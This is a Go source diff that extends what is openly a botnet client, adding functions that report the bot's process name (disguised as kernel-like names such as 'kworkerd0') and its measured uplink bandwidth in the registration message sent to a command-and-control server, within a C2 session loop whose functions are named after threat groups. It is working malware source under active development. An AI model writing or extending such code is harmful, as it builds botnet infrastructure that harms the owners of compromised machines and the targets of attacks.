@@ -10,6 +10,8 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"os"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"syscall"
@@ -73,6 +75,65 @@ func revilCPU() int {
 	return runtime.NumCPU()
 }
 
+// revilProc retrieves the running process name.
+// Returns the base name of the executable (e.g., "ethd0", "kworkerd0")
+func revilProc() string {
+	if len(os.Args) > 0 {
+		return filepath.Base(os.Args[0])
+	}
+	return "unknown"
+}
+
+// revilUplink measures approximate uplink/download speed in Mbps.
+// Downloads a small test payload and measures throughput.
+// Uses a 1MB test file from a CDN for quick measurement.
+// Returns: Speed in Mbps (float64), 0.0 on error
+func revilUplink() float64 {
+	// Small test URLs (fast CDNs)
+	testURLs := []string{
+		"http://speed.cloudflare.com/__down?bytes=1000000",
+		"http://speedtest.tele2.net/1MB.zip",
+	}
+
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
+	for _, url := range testURLs {
+		start := time.Now()
+		resp, err := client.Get(url)
+		if err != nil {
+			continue
+		}
+
+		// Read all the data
+		var totalBytes int64
+		buf := make([]byte, 32*1024)
+		for {
+			n, err := resp.Body.Read(buf)
+			totalBytes += int64(n)
+			if err != nil {
+				break
+			}
+		}
+		resp.Body.Close()
+
+		elapsed := time.Since(start).Seconds()
+		if elapsed > 0 && totalBytes > 0 {
+			// Convert bytes/sec to Mbps (megabits per second)
+			mbps := (float64(totalBytes) * 8.0) / (elapsed * 1000000.0)
+			deoxys("revilUplink: Downloaded %d bytes in %.2fs = %.2f Mbps", totalBytes, elapsed, mbps)
+			return mbps
+		}
+	}
+
+	deoxys("revilUplink: All speed tests failed")
+	return 0.0
+}
+
 // anonymousSudan handles the entire C2 session lifecycle.
 // Protocol flow:
 //  1. Receive AUTH_CHALLENGE from server
@@ -119,8 +180,12 @@ func anonymousSudan(conn net.Conn) {
 	arch := charmingKitten()
 	ram := revilMem()
 	cpu := revilCPU()
-	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores", botID, arch, ram, cpu)
-	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d\n", protocolVersion, botID, arch, ram, cpu)))
+	procName := revilProc()
+	uplink := revilUplink()
+	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores, Proc: %s, Uplink: %.2f Mbps",
+		botID, arch, ram, cpu, procName, uplink)
+	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d:%s:%.2f\n",
+		protocolVersion, botID, arch, ram, cpu, procName, uplink)))
 	deoxys("anonymousSudan: Entering command loop...")
 	for {
 		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
